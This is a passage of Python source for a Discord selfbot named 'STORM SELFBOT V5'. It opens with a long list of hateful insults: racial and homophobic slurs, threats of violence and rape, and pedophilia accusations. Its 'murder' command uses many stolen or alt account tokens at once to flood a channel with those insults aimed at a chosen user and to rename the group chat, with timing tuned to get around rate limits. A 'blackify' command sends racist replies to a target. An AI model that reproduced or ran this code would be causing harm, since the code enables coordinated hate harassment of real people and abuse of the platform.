"ILL\nBREAK\nYOUR\nFRAGILE\nLEGS\nSOFT\nFUCK\nAND\nTHEN\nSTOMP\nON\nUR\nDEAD\nCORPSE",
"weak prostitute",
"stfu dork ass nigga",
"garbage ass slut",
"ur weak",
"why am i so above u rn",
"soft ass nigga",
"frail slut",
"ur slow as fuck",
"you cant beat me",
"shut the fuck up LOL",
"you suck faggot ass nigga be quiet",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck faggot ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck weak ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck soft ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck hoe ass nigga", "y ur ass so weak nigga", "yo stfu nb fw u", "com reject", "yo retard stfu", "pedo", "frail fuck",
"weakling", "# stop bothering minors", "# Don't Fold", "cuck", "faggot", "hop off the alt loser" "ðŸ¤¡","sup feces sniffer how u been", "hey i heard u like kids", "femboy", 
"sup retard", "ur actually ass wdf", "heard u eat ur boogers", "zoophile", "doesn't ur mom abuse u", "autistic fuck", "stop fantasizing about ur mom weirdo", "hey slut shut the fuck up","you're hideous bitch shut up and clean my dogs feces","hey slut come lick my armpits","prostitute stfu slut","bitch shut up","you are ass nigga you wanna be me so bad","why do your armpits smell like that","stop eating horse semen you faggot","stop sending me your butthole in DMs gay boy","why are you drinking tap water out of that goats anus","say something back bitch","you have a green shit ring around your bootyhole","i heard you use snake skin dildos","ill cum in your mouth booty shake ass nigga","type in chat stop fingering your booty hole","i heard you worship cat feces","worthless ass slave","get your head out of that toilet you slut","is it true you eat your dads belly button lint? pedo","fuck up baby fucker","dont you jerk off to elephant penis","hey i heard you eat your own hemorroids","shes only 5 get your dick off of her nipples pedo","you drink porta potty water","hey bitch\nstfu\nyou dogshit ass nigga\nill rip your face apart\nugly ass fucking pedo\nwhy does your dick smell like that\ngay ass faggot loser\nfucking freak\nshut up","i\nwill\nrip\nyour\nhead\noff\nof\nyour\nshoulders\npussy\nass\nslime ball","nigga\nshut\nup\npedophile","stfu you dogshit ass nigga you suck\nyour belly button smells like frog anus you dirty ass nigga\nill rape your whole family with a strap on\npathetic ass fucking toad","YOU\nARE\nWEAK\nAS\nFUCK\nPUSSY\nILL\nRIP\nYOUR\nVEINS\nOUT\nOF\nYOUR\nARMS\nFAGGOT\nASS\nPUSSY\nNIGGA\nYOU\nFRAIL\nASS\nLITTLE\nFEMBOY","tranny anus licking buffalo","your elbows stink","frog","ugly ass ostrich","pencil necked racoon","why do your elbows smell like squid testicals","you have micro penis","you have aids","semen sucking blood worm","greasy elbow geek","why do your testicals smell like dead   buffalo appendages","cockroach","Mosquito","bald penguin","cow fucker","cross eyed billy goat","eggplant","sweat gobbler","cuck","penis warlord","slave","my nipples are more worthy than you","hairless dog","alligator","shave your nipples","termite","bald eagle","hippo","cross eyed chicken","spinosaurus rex","deformed cactus","prostitute","come clean my suit","rusty nail","stop eating water balloons","dumb blow dart","shit ball","slime ball","golf ball nose","take that stick of dynamite out of your nose","go clean my coffee mug","hey slave my pitbull just took a shit, go clean his asshole","walking windshield wiper","hornet","homeless pincone","hey hand sanitizer come lick the dirt off my hands","ice cream scooper","aborted fetus","dead child","stop watching child porn and fight back","homeless rodant","hammerhead shark","hey sledgehammer nose","your breath stinks","you cross eyed street lamp","hey pizza face","shave your mullet","shrink ray penis","hey shoe box come hold my balenciagas","rusty cork screw","pig penis","hey cow sniffer","walking whoopee cushion","stop chewing on your shoe laces","pet bullet ant","hey mop come clean my floor","*rapes your ass* now what nigga","hey tissue box i just nutted on your girlfriend come clean it up","watermelon seed","hey tree stump","hey get that fly swatter out of your penis hole","melted crayon","hey piss elbows","piss ball","hey q tip come clean my ears","why is that saxaphone in your anus","stink beetle","bed bug","cross eyed bottle of mustard","hey ash tray","hey stop licking that stop sign","why is that spatula in your anus","hey melted chocolate bar","dumb coconut"]


murder_groupchat = ["nigga is a pedofile","put your nipples away?? LOL","yo pedo wakey wakey","nigga gets cucked by oyke members and likes it","nigga your a skid","fat frail loser","nigga i broke your ospec","chin up fuckface","yo this nigga slow as shit","nigga ill rip your face off","odd ball pedofile nigga"]

@bot.command()
async def murder(ctx, user: discord.User):
    with open("tokens2.txt", "r") as f:
     tokens = f.read().splitlines()
    
    global murder_running
    murder_running = True
    channel_id = ctx.channel.id

    class SharedCounter:
        def __init__(self):
            self.value = 1
            self.lock = asyncio.Lock()

        async def increment(self):
            async with self.lock:
                current = self.value
                self.value += 1
                return current

    shared_counter = SharedCounter()

    async def send_message(token):
        headers = {'Authorization': token,'Content-Type': 'application/json'}

        last_send_time = 0
        backoff_time = 0.1

        while murder_running:
            try:
                current_time = time.time()
                time_since_last = current_time - last_send_time

                if time_since_last < backoff_time:
                    await asyncio.sleep(backoff_time - time_since_last)

                message = random.choice(murder_messages)
                count = await shared_counter.increment()

                payload = {'content': f"{user.mention} {message}\n```{count}```"}

                async with aiohttp.ClientSession() as session:
                    async with session.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', headers=headers, json=payload) as resp:
                        if resp.status == 200:
                            print(f"murder message sent with token: {token[-4:]}")
                            backoff_time = max(0.1, backoff_time * 0.95)
                            last_send_time = time.time()
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token: {token[-4:]}. Waiting {retry_after}s...")
                            backoff_time = min(2.0, backoff_time * 1.5)
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Failed to send message with token: {token[-4:]}. Status: {resp.status}")
                            await asyncio.sleep(1)

                await asyncio.sleep(random.uniform(0.1, 0.3))

            except Exception as e:
                print(f"Error in send_message for token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)

    async def change_name(token):
        headers = {'Authorization': token, 'Content-Type': 'application/json'}

        last_change_time = 0
        backoff_time = 0.5

        while murder_running:
            try:
                current_time = time.time()
                time_since_last = current_time - last_change_time

                if time_since_last < backoff_time:
                    await asyncio.sleep(backoff_time - time_since_last)

                gc_name = random.choice(murder_groupchat)
                count = await shared_counter.increment()

                payload = {'name': f"{gc_name} {count}"}

                async with aiohttp.ClientSession() as session:
                    async with session.patch(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers, json=payload) as resp:
                        if resp.status == 200:
                            print(f"GC name changed with token: {token[-4:]}")
                            backoff_time = max(0.5, backoff_time * 0.95)
                            last_change_time = time.time()
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token: {token[-4:]}. Waiting {retry_after}s...")
                            backoff_time = min(5.0, backoff_time * 1.5)
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Failed to change GC name with token: {token[-4:]}. Status: {resp.status}")
                            await asyncio.sleep(1)

                await asyncio.sleep(random.uniform(0.5, 1.0))

            except Exception as e:
                print(f"Error in change_name for token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)

    message_tasks = [send_message(token) for token in tokens]
    name_tasks = [change_name(token) for token in tokens]
    all_tasks = message_tasks + name_tasks
    combined_task = asyncio.gather(*all_tasks)
    murder_tasks[channel_id] = combined_task

    await ctx.send("Started murder command.")

murder_tasks = {}

@bot.command()
async def murderstop(ctx):
    global murder_running
    channel_id = ctx.channel.id

    if channel_id in murder_tasks:
        murder_running = False
        task = murder_tasks.pop(channel_id)
        task.cancel()
        await ctx.send("Murder command disabled.")

async def change_status():
    await bot.wait_until_ready()
    while True:
        for status in statuses:
            await bot.change_presence(activity=discord.Streaming(name=status, url="https://www.twitch.tv/ex"))
            await asyncio.sleep(10) 

@bot.command()
async def stream(ctx, *, statuses_list: str):
    global status_changing_task
    global statuses
    
    statuses = statuses_list.split(',')
    statuses = [status.strip() for status in statuses]
    
    if status_changing_task:
        status_changing_task.cancel()
    
    status_changing_task = bot.loop.create_task(change_status())
    await ctx.send(f"```Set Status to {statuses_list}```")


status_changing_task = None

@bot.command()
async def streamoff(ctx):
    global status_changing_task
    
    if status_changing_task:
        status_changing_task.cancel()
        status_changing_task = None
        await bot.change_presence(activity=None)  
        await ctx.send(f'status rotation stopped')
    else:
        await ctx.send(f'status rotation is not running')


@bot.command()
async def dreact(ctx, user: discord.User, *emojis):
    if not emojis:
        await ctx.send("```Please provide at least one emoji```")
        return
        
    dreact_users[user.id] = [list(emojis), 0]  # [emojis_list   , and then current index cuz why not >.<]
    await ctx.send(f"```ansi\n {qqq}⚡STORM SELFBOT V5⚡{qqq}\n```")
    await ctx.send(f"```ansi\n {c}Started reacting to {user.name}{c}\n```")
    await ctx.send(f"```ansi\n {qqq}⚡STORM SELFBOT V5⚡{qqq}```")

@bot.command()
async def dreactoff(ctx, user: discord.User):
    if user.id in dreact_users:
        del dreact_users[user.id]
        await ctx.send(f"```Stopped reacting to {user.name}'s messages```")
    else:
        await ctx.send(f"```ansi\n {qqq}⚡STORM SELFBOT V5⚡{qqq}\n```")
        await ctx.send(f"```ansi\n {mjj}Stopped all reactions.{mjj}\n```")
        await ctx.send(f"```ansi\n {qqq}⚡STORM SELFBOT V5⚡{qqq}\n```") 

import re

import disnake
import traceback

@bot.event
async def on_ready():
    try:
        # Clear console
        os.system('cls' if os.name == 'nt' else 'clear')

        # ===== DYNAMIC CONTENT COLLECTION =====
        user = bot.user
        stats = {
            'header': "STORM SELFBOT V5 - ONLINE",
            'user': f"{user.name} ({user.id})",
            'created': user.created_at.strftime("%Y-%m-%d %H:%M:%S"),
            'guilds': len(bot.guilds),
            'friends': len(user.friends),
            'latency': f"{round(bot.latency * 1000)}ms",
            'system': f"Python {platform.python_version()} | RAM: {psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2:.2f}MB",
            'library': f"discord.py-self v{discord.__version__}",
            'developer': "NotHerXenon",
            'support': "https://discord.gg/DMzSdUKMun"
        }

        # ===== DYNAMIC WIDTH CALCULATION =====
        max_width = max(
            len(stats['header']),
            len(stats['user']) + 8,
            len(stats['system']) + 8,
            len(stats['support']) + 8
        )

        # ===== PERFECTLY ALIGNED UI =====
        def create_line(text, prefix=""):
            return f"{qqq}║ {c}{prefix}{text.ljust(max_width - len(prefix))}{qqq}║\n"

        border = f"{qqq}╔{'═' * (max_width + 2)}╗\n"
        separator = f"{qqq}╠{'═' * (max_width + 2)}╣\n"
        footer = f"{qqq}╚{'═' * (max_width + 2)}╝"

        display = (
            border +
            f"{qqq}║ {c}{stats['header'].center(max_width)}{qqq}║\n" +
            separator +
            create_line(stats['user'], "User: ") +
            create_line(stats['created'], "Created: ") +
            separator +
            create_line(str(stats['guilds']), "Guilds: ") +
            create_line(str(stats['friends']), "Friends: ") +
            create_line(stats['latency'], "Latency: ") +
            separator +
            create_line(stats['system'], "System: ") +
            create_line(stats['library'], "Library: ") +
            separator +
            create_line(stats['developer'], "Developer: ") +
            create_line(stats['support'], "Support: ") +
            footer
        )

        print(display)

        # ===== STATUS UPDATES WITH CHECKMARKS =====
        def status_msg(text, success=True):
            symbol = f"{c}✓" if success else f"{c}✗"
            print(f"{qqq}[{symbol}{qqq}] {c}{text}")

        try:
            global alw_handler
            alw_handler = ALWHandler(bot)
            status_msg("ALW Handler initialized")
            
        except Exception as e:
            status_msg(f"Initialization error: {str(e)}", False)

    except Exception as error:
        error_width = max(50, len(str(error)) + 4)
        error_display = (
            f"\n{qqq}╔{'═' * error_width}╗\n"
            f"{qqq}║ {c}{'FATAL ERROR'.center(error_width)}{qqq}║\n"
            f"{qqq}╠{'═' * error_width}╣\n"
            f"{qqq}║ {c}{str(error).center(error_width)}{qqq}║\n"
            f"{qqq}╚{'═' * error_width}╝\n"
        )
        print(error_display)
        traceback.print_exc()
    
import re
afk_responded = set()  # Track users who have received a response to prevent further responses
afk_watchers = {}
last_messages = {}  # Initialize the last_messages dictionary
waiting_for_response = {}
def calculate_delay(response: str, wpm: int = 120) -> float:
    word_count = len(response.split())
    delay_per_word = 60 / wpm
    total_delay = word_count * delay_per_word
    return total_delay

@bot.command()
async def antiafk(ctx, user: discord.User):
    if user.id not in afk_watchers:
        afk_watchers[user.id] = True
        await ctx.message.delete()
        await ctx.send(f"Started monitoring {user.mention} for AFK checks.", delete_after=5)
    else:
        await ctx.send(f"{user.mention} is already being monitored.", delete_after=5)

@bot.command()
async def afke(ctx, user: discord.User):
    if user.id in afk_watchers:
        del afk_watchers[user.id]
        await ctx.message.delete()
        await ctx.send(f"Stopped monitoring {user.mention} for AFK checks.", delete_after=2)
    else:
        await ctx.send(f"{user.mention} is not being monitored.", delete_after=5)
        
@bot.command()
async def stfu(ctx, member: discord.Member):
    if member.id not in autodele_users:
        autodele_users[member.id] = True
        await ctx.send(f"{member.mention} has auto delete on them ")
    else:
        await ctx.send(f"{member.mention} has auto delete on them already")

@bot.command()
async def stfuoff(ctx, member: discord.Member):
    if member.id in autodele_users:
        del autodele_users[member.id]
        await ctx.send(f"{member.mention} auto delete has been turned off")
    else:
        await ctx.send(f"{member.mention} doesn't have auto delete on them ")


autodele_users = {}
stfu_users = {}
    
@bot.event
async def on_message(message):
    if message.author.id in autoreact_users:
        emoji = autoreact_users[message.author.id]
        try:
            await message.add_reaction(emoji)
        except Exception as e:
            print(f"Error adding autoreact reaction: {str(e)}")

            
    if message.author.bot:
        return

    # Check if the author is in the autoflood list for the whole server or DM channel
    if message.guild:  # In server context
        key_server = (message.author.id, str(message.guild.id))  # Log entire server ID
    else:  # In DM or group context
        key_server = (message.author.id, str(message.channel.id))  # Log specific channel ID

    if key_server in auto_flood_users:
        flood_message = auto_flood_users[key_server]
        await send_flood_reply_message(message, flood_message)
        await asyncio.sleep(1.26)  # Adjust rate limit to avoid spamming too quickly
    if message.author.id in autodele_users:
        await message.delete()
    global reacting, current_index, waiting_for_response, afk_responded,kill_target_id, kill_tasks
    
        
        

 


 
    
    if message.author.bot:

        return
    
    def SlotBotData():
        print(f" SERVER: {message.guild}\n CHANNEL: {message.channel}")
        

    for user_id, data in dreact_users.items():
           if message.author.id == user_id:
            emojis = data[0]
            current_index = data[1]
            try:
                await message.add_reaction(emojis[current_index])
                data[1] = (current_index + 1) % len(emojis)
            except Exception as e:
                print(e)





    user_mention = f"<@{message.author.id}>"




    if user_mention in ar1_targets:

        reply_list = ar1_targets[user_mention]

        if reply_list:

            await message.reply(reply_list[0])

            # Move the first item to the end to cycle through the list

            ar1_targets[user_mention].append(ar1_targets[user_mention].pop(0))

            return  # Prevent further processing of this message



    if user_mention in ar2_targets:

        spaced_list = ar2_targets[user_mention]

        if spaced_list:

            await message.reply(spaced_list[0])

            # Move the first item to the end to cycle through the list

            ar2_targets[user_mention].append(ar2_targets[user_mention].pop(0))

            return  # Prevent further processing of this message

    if message.author.id in afk_watchers:
        # Check for 'check' at the end of the message
        if message.content.lower().endswith("check"):
            delay = calculate_delay("here")
            await asyncio.sleep(delay)
            async with message.channel.typing():
                await asyncio.sleep(random.uniform(0.9, 1.5))
                await message.channel.send("here")
            return

        # If the message ends with 'say', listen for the next message
        if message.content.lower().endswith("say"):
            waiting_for_response[message.author.id] = True
            return  # Wait for a second message

        # Handle first message if it starts with "say"
        if message.content.lower().startswith("say "):
            match = re.search(r'\bsay\s+(.+)', message.content.lower())
            if match:
                response = match.group(1).strip()
                response = re.sub(r'<@!?[0-9]+>', '', response).strip()  # Remove user mentions

                # Replace standalone 'I' followed by 'M' (both standalone) with 'ur'
                response = re.sub(r'\bi\b\s+m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace standalone 'M' with 'r'
                response = re.sub(r'\b(m)\b', 'r', response, flags=re.IGNORECASE)

                # Replace "I am a" with "ur a"
                response = re.sub(r'\b(i am a)\s*(.+)', r'ur a \2', response, flags=re.IGNORECASE)

                # Replace standalone 'I' followed by apostrophe with 'ur'
                response = re.sub(r'\bi\'m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace other variations with "ur"
                response = re.sub(r'\b(im|my|i\'m|i m|im a|i\'m a|I am a)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)
                response = re.sub(r'\b(im|my|i\'m|i m)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)

                # Replace standalone 'I' with 'u'
                response = re.sub(r'\bi\b', 'u', response, flags=re.IGNORECASE)

                # Special cases with variations
                if any(phrase in response.lower() for phrase in ["ur my god", "you’re my god", "you are my god", "ur my god", "youre my god"]):
                    response = "im ur god"
                elif any(phrase in response.lower() for phrase in ["u own me", "you own me"]):
                    response = "i own you"
                elif any(phrase in response.lower() for phrase in ["im ur slut", "ur my slut", "youre my slut", "you are my slut", "u are my slut"]):
                    response = "ur my slut"
                elif any(phrase in response.lower() for phrase in ["im ur bitch", "ur my bitch", "youre my bitch", "you are my bitch", "u are my bitch"]):
                    response = "ur my bitch"

                # Send response
                delay = calculate_delay(response)
                await asyncio.sleep(delay)

                # Simulate typing
                typing_delay = random.uniform(0.9, 1.5)
                async with message.channel.typing():
                    await asyncio.sleep(typing_delay)
                    await message.channel.send(response)
                return  # Prevent further processing

        # Handle cases where the message starts with 'afk', 'bot', or 'client' and includes 'say'
        if (message.content.lower().startswith("afk") or 
            message.content.lower().startswith("bot") or 
            message.content.lower().startswith("client")) and "say" in message.content.lower():
            match = re.search(r'\bsay\s+(.+)', message.content.lower())
            if match:
                response = match.group(1).strip()
                response = re.sub(r'<@!?[0-9]+>', '', response).strip()  # Remove user mentions

                # Replace standalone 'I' followed by 'M' (both standalone) with 'ur'
                response = re.sub(r'\bi\b\s+m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace standalone 'M' with 'r'
                response = re.sub(r'\b(m)\b', 'r', response, flags=re.IGNORECASE)

                # Replace "I am a" with "ur a"
                response = re.sub(r'\b(i am a)\s*(.+)', r'ur a \2', response, flags=re.IGNORECASE)

                # Replace standalone 'I' followed by apostrophe with 'ur'
                response = re.sub(r'\bi\'m\b', 'ur', response, flags=re.IGNORECASE)

                # Replace other variations with "ur"
                response = re.sub(r'\b(im|my|i\'m|i m|im a|my|i\'m a|I am a)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)
                response = re.sub(r'\b(im|my|i\'m|i m)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)

                # Replace standalone 'I' with 'u'
                response = re.sub(r'\bi\b', 'u', response, flags=re.IGNORECASE)

                # Special cases with variations
                if any(phrase in response.lower() for phrase in ["ur my god", "you’re my god", "you are my god", "ur my god", "youre my god"]):
                    response = "im ur god"
                elif any(phrase in response.lower() for phrase in ["u own me", "you own me"]):
                    response = "i own you"
                elif any(phrase in response.lower() for phrase in ["im ur slut", "ur my slut", "youre my slut", "you are my slut", "u are my slut"]):
                    response = "ur my slut"
                elif any(phrase in response.lower() for phrase in ["im ur bitch", "ur my bitch", "youre my bitch", "you are my bitch", "u are my bitch"]):
                    response = "ur my bitch"

                # Send response
                delay = calculate_delay(response)
                await asyncio.sleep(delay)

                # Simulate typing
                typing_delay = random.uniform(0.9, 1.5)
                async with message.channel.typing():
                    await asyncio.sleep(typing_delay)
                    await message.channel.send(response)
                return  # Prevent further processing

    # Check for a second message if the user is waiting for a response
    if message.author.id in waiting_for_response and waiting_for_response[message.author.id]:
        response = message.content.strip()
        response = re.sub(r'<@!?[0-9]+>', '', response).strip()  # Remove user mentions

        # Replace standalone 'I' followed by 'M' (both standalone) with 'ur'
        response = re.sub(r'\bi\b\s+m\b', 'ur', response, flags=re.IGNORECASE)

        # Replace standalone 'M' with 'r'
        response = re.sub(r'\b(m)\b', 'r', response, flags=re.IGNORECASE)

        # Replace "I am a" with "ur a"
        response = re.sub(r'\b(i am a)\s*(.+)', r'ur a \2', response, flags=re.IGNORECASE)

        # Replace standalone 'I' followed by apostrophe with 'ur'
        response = re.sub(r'\bi\'m\b', 'ur', response, flags=re.IGNORECASE)

        # Replace other variations with "ur"
        response = re.sub(r'\b(im|my|i\'m|i m|im a|i\'m a|I am a)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)
        response = re.sub(r'\b(im|my|i\'m|i m)\s*(.+)', r"ur \2", response, flags=re.IGNORECASE)

        # Replace standalone 'I' with 'u'
        response = re.sub(r'\bi\b', 'u', response, flags=re.IGNORECASE)

        # Special cases with variations
        if any(phrase in response.lower() for phrase in ["ur my god", "you’re my god", "you are my god", "ur my god", "youre my god"]):
            response = "im ur god"
        elif any(phrase in response.lower() for phrase in ["u own me", "you own me"]):
            response = "i own you"
        elif any(phrase in response.lower() for phrase in ["im ur slut", "ur my slut", "youre my slut", "you are my slut", "u are my slut"]):
            response = "ur my slut"
        elif any(phrase in response.lower() for phrase in ["im ur bitch", "ur my bitch", "youre my bitch", "you are my bitch", "u are my bitch"]):
            response = "ur my bitch"

        # Send the response for the second message
        delay = calculate_delay(response)
        await asyncio.sleep(delay)

        # Simulate typing
        typing_delay = random.uniform(0.9, 1.5)
        async with message.channel.typing():
            await asyncio.sleep(typing_delay)
            await message.channel.send(response)

        del waiting_for_response[message.author.id]  # Clear the waiting state after responding
        return  # Prevent further processing

    

            
        

    await handle_auto_reply(message)
   # If alw_handler is defined, call its on_message method
    if alw_handler is not None:
        await alw_handler.on_message(message)
    # Process commands after handling the message
    await bot.process_commands(message)
    
async def handle_auto_reply(message):
    global auto_reply_target_id, auto_reply_message
    if auto_reply_target_id and message.author.id == auto_reply_target_id:
        await message.reply(auto_reply_message)


@bot.command()
async def alw(ctx, option: str):
    global alw_handler
    if alw_handler is None:
        await ctx.send("ALWHandler is not initialized.")
        return

    if option.lower() == "on":
        alw_handler.alw_enabled = True
        alw_handler.uid = str(ctx.author.id)  # Set user ID from context
        await ctx.send(f"```ansi\n Auto Last Word feature {c} enabled.```")
    elif option.lower() == "off":
        alw_handler.alw_enabled = False
        await ctx.send(f"```ansi\n Auto Last Word feature {mjj} disabled.```")
    else:
        await ctx.send("Invalid option. Use 'on' or 'off'.")  
        
        
    
        
           
@bot.command()
async def wl(ctx, user_id: int):
    """Add a user ID to the whitelist."""
    global alw_handler

    if alw_handler is None:
        await ctx.send("ALWHandler is not initialized.")
        return

    # Add user_id to whitelist
    alw_handler.whitelist.add(str(user_id))  # Add to the in-memory set
    alw_handler.save_whitelist()  # Save to file

    await ctx.send(f"User ID {user_id} has been added to the whitelist.")

@bot.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: discord.User = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: phcomment <user> <message>')
        return

    avatar_url = user.avatar_url_as(format="png")

    endpoint = f"https://nekobot.xyz/api/imagegen?type=phcomment&text={args}&username={user.name}&image={avatar_url}"
    r = requests.get(endpoint)
    res = r.json()

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"{user.name}_pornhub_comment.png"))
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")


blackify_tasks = {}
blackifys = [
    "woah jamal dont pull out the nine",
    "cotton picker 🧑‍🌾",
    "back in my time...",
    "worthless nigger! 🥷",
    "chicken warrior 🍗",
    "its just some watermelon chill 🍉",
    "are you darkskined perchance?",
    "you... STINK 🤢"
]
@bot.command()
async def blackify(ctx, user: discord.Member):
    blackify_tasks[user.id] = True
    await ctx.send(f"```Seems to be that {user.name}, IS BLACK 🤢```")

    emojis = ['🍉', '🍗', '🤢', '🥷', '🔫']

    while blackify_tasks.get(user.id, False):
        try:
            async for message in ctx.channel.history(limit=10):
                if message.author.id == user.id:
                    for emoji in emojis:
                        try:
                            await message.add_reaction(emoji)
                        except:
                            pass
                    try:
                        reply = random.choice(blackifys)
                        await message.reply(reply)
                    except:
                        pass
                        
                    break
                    
            await asyncio.sleep(1)
        except:
            pass

@bot.command()
async def unblackify(ctx, user: discord.Member):
    if user.id in blackify_tasks:
        blackify_tasks[user.id] = False
        await ctx.send(f"```Seems to me that {user.name}, suddenly changed races 🧑‍🌾```")  
        
        
import logging


logging.basicConfig(level=logging.INFO)


self_gcname = [
    "{UPuser} UR ASS LOL", "{UPuser}UR FUCKIN LOSER DORK FUCK", "{UPuser} BITCH ASS NIGGA DONT FOLD", "{UPuser} WE GOING FOREVER PEDO", "{UPuser}STORM SELFBOT V5 SELF BOT>>>", "{UPuser}STORM SELFBOT V5 RUNS U", "{UPuser}NotHerXenon RUNS U ", "{UPuser}Safari RUNS U", "{UPuser} NotHerXenon RUNS U", "{UPuser}Safari RUNS U "

]

    
@bot.command()
async def ugc(ctx, user: discord.User):
    global ugc_task
    
    if ugc_task is not None:
        await ctx.send("```Group chat name changer is already running```")
        return
        
    if not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send("```This command can only be used in group chats.```")
        return

    async def name_changer():
        counter = 1
        unused_names = list(self_gcname)
        
        while True:
            try:
                if not unused_names:
                    unused_names = list(self_gcname)
                
                base_name = random.choice(unused_names)
                unused_names.remove(base_name)
                
                formatted_name = base_name.replace("{user}", user.name).replace("{UPuser}", user.name.upper())
                new_name = f"{formatted_name} {counter}"
                
                await ctx.channel._state.http.request(
                    discord.http.Route(
                        'PATCH',
                        '/channels/{channel_id}',
                        channel_id=ctx.channel.id
                    ),
                    json={'name': new_name}
                )
                
                await asyncio.sleep(0.1)
                counter += 1
                
            except discord.HTTPException as e:
                if e.code == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                    await asyncio.sleep(retry_after)
                    continue
                else:
                    await ctx.send(f"```Error: {str(e)}```")
                    break
            except asyncio.CancelledError:
                break
            except Exception as e:
                await ctx.send(f"```Error: {str(e)}```")
                break

    ugc_task = asyncio.create_task(name_changer())
    await ctx.send("```Group chat name changer started```")

@bot.command()
async def ugcend(ctx):
    global ugc_task
    
    if ugc_task is None:
        await ctx.send("```Group chat name changer is not currently running```")
        return
        
    ugc_task.cancel()
    ugc_task = None
    await ctx.send("```Group chat name changer stopped```")


@bot.command()
async def help(ctx, command_name: str = None):
    # ANSI color codes
    R = "\033[0m"  # Reset
    C = "\033[1;36m"  # Cyan
    G = "\033[1;32m"  # Green
    Y = "\033[1;33m"  # Yellow
    B = "\033[1;34m"  # Blue
    M = "\033[1;35m"  # Magenta
    W = "\033[1;37m"  # White

    if command_name is None:
        help_ui = f"""```ansi
{C}╭──────────────────────────────────────────────╮
{B}{M}          STORM SELFBOT V5 - HELP MENU         {R}
{C}├──────────────────────────────────────────────┤
{W}Usage: {G}.help <command>{W}
{Y}Example: {G}.help autopress{W}

{C}╰──────────────────────────────────────────────╯
{M}{B}Developer: {C}NotHerXenon{R}
```"""
        await ctx.send(help_ui, delete_after=20)
        return

    command_obj = bot.get_command(command_name.lower())
    if not command_obj:
        error_ui = f"""```ansi
{C}╭──────────────────────────────────────────────╮
{B}{M}          STORM SELFBOT V5 - ERROR             {R}
{C}├──────────────────────────────────────────────┤
{R}{W}Command {Y}'{command_name}'{W} not found!

{Y}Type {G}.menu{W} to see available commands{R}

{C}╰──────────────────────────────────────────────╯
{M}{B}Developer: {C}NotHerXenon{R}
```"""
        await ctx.send(error_ui, delete_after=15)
        return

    # Build subcommands section if available
    subcommands_text = ""
    if hasattr(command_obj, 'commands'):
        max_name_len = max(len(cmd.name) for cmd in command_obj.commands) if command_obj.commands else 0
        subcommands_text = f"\n{C}├──────────────────────────────────────────────┤\n"
        subcommands_text += f"{G}Subcommands:{R}\n"
        for subcmd in command_obj.commands:
            sub_name = subcmd.name.ljust(max_name_len)
            subcommands_text += f"{Y}◈ {C}{sub_name} {Y}→ {W}{subcmd.signature}{R}\n"
            if subcmd.help:
                subcommands_text += f"   {W}{subcmd.help}{R}\n"

    # Build the command help UI
    help_ui = f"""```ansi
{C}╭──────────────────────────────────────────────╮
{B}{M}          STORM SELFBOT V5 - COMMAND HELP      {R}
{C}├──────────────────────────────────────────────┤
{G}Command: {W}{command_obj.qualified_name}{R}
{Y}◈{R} {C}Usage: {W}{ctx.prefix}{command_obj.qualified_name} {command_obj.signature}{R}
